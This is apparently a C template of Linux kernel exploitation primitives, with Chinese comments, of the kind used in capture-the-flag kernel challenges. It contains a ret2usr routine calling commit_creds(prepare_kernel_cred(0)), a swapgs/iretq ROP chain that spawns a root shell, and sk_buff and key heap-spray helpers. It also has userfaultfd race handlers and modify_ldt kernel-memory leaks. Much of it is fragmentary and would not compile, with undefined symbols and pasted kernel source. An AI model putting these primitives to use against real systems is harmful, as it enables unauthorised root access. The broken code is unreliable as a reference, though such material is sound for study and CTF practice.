#define _GNU_SOURCE

// clang-format off
#include <asm/ldt.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <semaphore.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/ptrace.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <linux/keyctl.h>
#include <linux/userfaultfd.h>

// clang-format on

size_t kernel_base = 0xffffffff81000000;
size_t kernel_offset = 0;

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define log_debug(fmt, ...) \
  dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)

#define log_info(fmt, ...)                                              \
  dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)

#define log_warning(fmt, ...)                                            \
  dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)

#define log_error(fmt, ...)                                           \
  dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)

#define die(fmt, ...)                       \
  do {                                      \
    log_error(fmt, ##__VA_ARGS__);          \
    log_error("Exit at line %d", __LINE__); \
    exit(1);                                \
  } while (0)

/*
 * 保存用户态数据
 */
uint64_t user_cs, user_ss, user_rflags, user_rsp;

void save_status_() {
  asm volatile (
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_rsp, rsp;"
      "pushf;"
      "pop user_rflags;");
  log_info("status saved");
}

void save_status() {
  asm volatile (
      "movq %%cs, %0;"
      "movq %%ss, %1;"
      "movq %%rsp, %3;"
      "pushfq;"
      "pop %2;"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
      :
      : "memory");
}

static void restore_status() {
  asm volatile (
      "swapgs ;"
      "movq %0, 0x20(%%rsp)\t\n"
      "movq %1, 0x18(%%rsp)\t\n"
      "movq %2, 0x10(%%rsp)\t\n"
      "movq %3, 0x08(%%rsp)\t\n"
      "movq %4, 0x00(%%rsp)\t\n"
      "iretq"
      :
      : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs),
        "r"(get_shell));
}

/*
 * 绑定cpu core
 */
void bind_core(int core) {
  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
  log_info("bind core to => %d", core);
}

/*
 * root 执行，从而获得权限
 */
void get_shell(void) {
  if (getuid()) {
    die("Failed to get the root!");
  }

  log_info(" Successful to get the root.");
  log_info(" execve root shell now...");

  system("/bin/sh");
  exit(0);
}

static void get_root_shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  if (!getuid()) {
    log_info("get shell !");
    execve("/bin/sh", argv, envp);
  } else {
    die("fail get root");
  }
}

void rop() {
  size_t rop[0x10], i = 0;
  // swapgs --> iretq: rip, cs, rflags, rsp, ss. get_she;;
  rop[i++] = swapgs;  // 后面还存在指令，需要查看到ret前的内容
  rop[i++] = 0;
  rop[i++] = iretq;
  rop[i++] = (size_t)get_shell;  // rip
  rop[i++] = user_cs;
  rop[i++] = user_rflags;
  rop[i++] = user_rsp;
  rop[i++] = user_ss;
}

/*
 * ret2usr 的执行
 */
void ret2_usr(void) {
  char *(*pkc)(int) = (void *)(prepare_kernel_cred);
  void (*cc)(char *) = (void *)(commit_creds);
  (*cc)((*pkc)(0));
  restore_status();
}

/*
 * tty 结构体获取
 */
int get_tty_struct() {
  int ptmx_fd = open("/dev/ptmx", O_RDWR);
  if (ptmx_fd <= 0) {
    die("ptmx open failed");
  }
  read(fd, tty_buf, 0);
  if (tty_buf[0] == 0x100005401) {
    die("tty read error");
  }
  return 0;
}

/*
 * seq_file
 * 0x0000000000000000 : xchg esp, eax ; ret ;
 * 0x0000000000000000 : xchg rsp, r15 ; ret ;
 * 0x0000000000000000 : xchg esp, r15d ; ret ;
 */
int seq_open() {
  int seq;
  if ((seq = open("/proc/self/stat", O_RDONLY)) == -1) {
    die("seq open fail");
  }
  return seq;
}


/*
 * socket buffer: 堆喷射
 */
#define SOCKET_NUM 8
#define SK_BUFF_NUM 128

// 创建
int init_socket_array(int sk_socket[SOCKET_NUM][2]) {
  /* socket pairs to spray sk_buff */
  for (int i = 0; i < SOCKET_NUM; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i]) < 0) {
      log_warning("failed to create no.%d socket pair!\n", i);
      return -1;
    }
  }
  return 0;
}

// 喷射
int spray_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) {
    for (int j = 0; j < SK_BUFF_NUM; j++) {
      if (write(sk_socket[i][0], buf, size) < 0) {
        log_warning("failed to spray %d sk_buff for %d socket!", j, i);
        return -1;
      }
    }
  }

  return 0;
}

// free 结构体
int free_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) {
    for (int j = 0; j < SK_BUFF_NUM; j++) {
      if (read(sk_socket[i][1], buf, size) < 0) {
        log_warning("failed to received sk_buff!");
        return -1;
      }
    }
  }

  return 0;
}

/*
 * key 
 */
// kernel obj1 => description  obj2 => payload
// obj3 obj4
int key_alloc(char *description, char *payload, size_t plen) {
  return syscall(__NR_add_key, "user", description, payload, plen,
                 KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, char *payload, size_t plen) {
  return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, char *buffer, size_t buflen) {
  return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid) {
  return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid) {
  return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

/*
 * setxattr -> copy_from_user() 
 */


/*
 * userdefault fd
 * @fault_page: mmap的一块区域
 */
void register_userdefault(void *fault_page, void *handler) {
  pthread_t thr;
  struct uffdio_api ua;
  struct uffdio_register ur;
  uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  ua.api = UFFD_API;
  ua.features = 0;
  if (ioctl(uffd, UFFDIO_API, &ua) == -1) {
    die("ioctl-UFFDIO_API");
  }

  ur.range.start = (unsigned long)fault_page;  //我们要监视的区域
  ur.range.len = PAGE_SIZE;
  ur.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) {  //注册缺页错误处理
    //当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
    die("ioctl-UFFDIO_REGISTER");
  }
  //开一个线程，接收错误的信号，然后处理
  int s = pthread_create(&thr, NULL, handler, (void *)uffd);
  if (s != 0) {
    die("pthread_create");
  }
}

/*
 * fuse: 主要是两个call_back
 */


/*
 * shm_file_data 0x20
 */
struct shm_file_data {
  int id;
  struct ipc_namespace *ns;
  struct file *file;
  const struct vm_operations_struct *vm_ops;
};

void create_shm_file_data() {
  int shmid;
  if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
    die("shmget fail");
  }

  // allocate structure
  char *shm_addr = shmat(shmid, NULL, 0);
  if (shm_addr == (void *)-1) {
    die("shmat fail");
  }

  // free
  if (shmdt(shm_addr) < 0) { 
    die("shmdt!");
  }
}

/*
 * ret2dir
 */


/*
 * ldt
 */
struct ldt_struct {
  struct desc_struct *entries;
  unsigned int nr_entries;
  int slot;
};

SYSCALL_DEFINE3(modify_ldt, int, func, void __user *, ptr, unsigned long,
                bytecount) {
  int ret = -ENOSYS;

  switch (func) {
    case 0:
      ret = read_ldt(ptr, bytecount);
      break;
    case 1:
      ret = write_ldt(ptr, bytecount, 1);
      break;
    case 2:
      ret = read_default_ldt(ptr, bytecount);
      break;
    case 0x11:
      ret = write_ldt(ptr, bytecount, 0);
      break;
  }
  /*
   * The SYSCALL_DEFINE() macros give us an 'unsigned long'
   * return type, but tht ABI for sys_modify_ldt() expects
   * 'int'.  This cast gives us an int-sized value in %rax
   * for the return code.  The 'unsigned' is necessary so
   * the compiler does not try to sign-extend the negative
   * return codes into the high half of the register when
   * taking the value from int->long.
   */
  return (unsigned int)ret;
}

void ldt_usage() {
  struct user_desc desc;

  /* init descriptor info in direct mapping area*/
  desc.base_addr = 0xff0000;
  desc.entry_number = 0x8000 / 8;
  desc.limit = 0;
  desc.seg_32bit = 0;
  desc.contents = 0;
  desc.limit_in_pages = 0;
  desc.lm = 0;
  desc.read_exec_only = 0;
  desc.seg_not_present = 0;
  desc.useable = 0;

  syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));  // change ldt

  /* leak kernel direct mapping area by modify_ldt() */
  while (1) {
    retval = syscall(SYS_modify_ldt, 0, &temp, 8);
    if (retval > 0) {
      printf("[-] read data: %llx\n", temp);
      break;
    } else if (retval == 0) {
      log_error("no mm->context.ldt!");
    }
    page_offset_base += 0x1000000;
  }
}

/*
 * hardware break point
 */
#define DR_OFFSET(num) ((void *)(&((struct user *)0)->u_debugreg[num]))
void create_hbp(pid_t pid, void *addr) {
  // Set DR0: HBP address
  if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(0), addr) != 0) {
    die("create hbp ptrace dr0: %m");
  }

  /* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops
   * on the instruction which causes the exception. bits 16,17 means we stop
   * on data read or write. */
  unsigned long dr_7 = (1 << 0) | (1 << 8) | (1 << 16) | (1 << 17);
  if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(7), (void *)dr_7) != 0) {
    die("create hbp ptrace dr7: %m");
  }
}

/*
 * io_uring
 */

struct io_uring_cqe {
  __u64 user_data; /* sqe->data submission passed back */
  __s32 res;       /* result code for this event */
  __u32 flags;
  __u64 big_cqe[];
};

/*
 * pt_regs
 * CONFIG_RANDOMIZE_KSTACK_OFFSET=y  可以一定程度避免这种攻击
 */
__asm__(
    "mov r15, 0x55555555;"
    "mov r14, 0x44444444;"
    "mov r13, 0x33333333;"
    "mov r12, 0x22222222;"
    "mov rbp, 0xbbbb1111;"
    "mov rbx, 0xbbbb2222;"
    "mov r11, 0x11111111;"
    "mov r10, 0x11110000;"
    "mov r9,  0x99999999;"
    "mov r8,  0x88888888;"
    "xor rax, rax;"
    "mov rcx, 0x666666;"
    "mov rdx, 8;"
    "mov rsi, rsp;"
    "mov rdi, seq_fd;"
    "syscall");


/*
 * poll_list ?
 */
struct pollfd {
	int fd;
	short events;
	short revents;
};

struct poll_list {
	struct poll_list *next;
	int len;
	struct pollfd entries[0];
};

// int poll(struct pollfd fds[], nfds_t nfds, int timeout); 
// fds:一个pollfd结构的数组
// nfds:表示'fds'数组中的文件描述符数量
// timeout:表示超时时间，单位是毫秒。
int poll_example() {
  struct pollfd *pfds;
  int fd;
  int nfds = 256; 
  int timeout = 3000;
  pfds = calloc(nfds, sizeof(struct pollfd));
  fd = open("/etc/passwd", O_RDONLY);
  for (int i = 0; i < nfds; i++)
  {
      pfds[i].fd = fd;
      pfds[i].events = POLLERR;
  }
  poll(pfds, nfds, timeout);
  //将会进行阻塞，阻塞的时间由timeout决定
}

/*
 * pgv - alloc page
 */
struct packet_ring_buffer {
	struct pgv		*pg_vec;

	unsigned int		head;
	unsigned int		frames_per_block;
	unsigned int		frame_size;
	unsigned int		frame_max;

	unsigned int		pg_vec_order;
	unsigned int		pg_vec_pages;
	unsigned int		pg_vec_len;

	unsigned int __percpu	*pending_refcnt;

	union {
		unsigned long			*rx_owner_map;
		struct tpacket_kbdq_core	prb_bdqc;
	};
};

struct pgv {
    char *buffer;
};




/*
 * subprocess_info
 */
// use socket(22, AF_INET, 0) create 如下的结构体， size-128 kmalloc-128
// 因为该结构体在创建之后就会被释放掉，因此基于该结构体的利用都要用到条件竞争。
struct subprocess_info {
	struct work_struct work;   // leak kernel base by work.func
	struct completion *complete;
	const char *path;
	char **argv;
	char **envp;
	int wait;
	int retval;
	int (*init)(struct subprocess_info *info, struct cred *new);
	void (*cleanup)(struct subprocess_info *info); // 设置info->cleanup，触发执行if (info->cleanup) info->cleanup(info);
	void *data;
} __randomize_layout;

struct work_struct {
	atomic_long_t data;
	struct list_head entry;
	work_func_t func;
#ifdef CONFIG_LOCKDEP
	struct lockdep_map lockdep_map;
#endif
};

/*
 * prctl ?
 */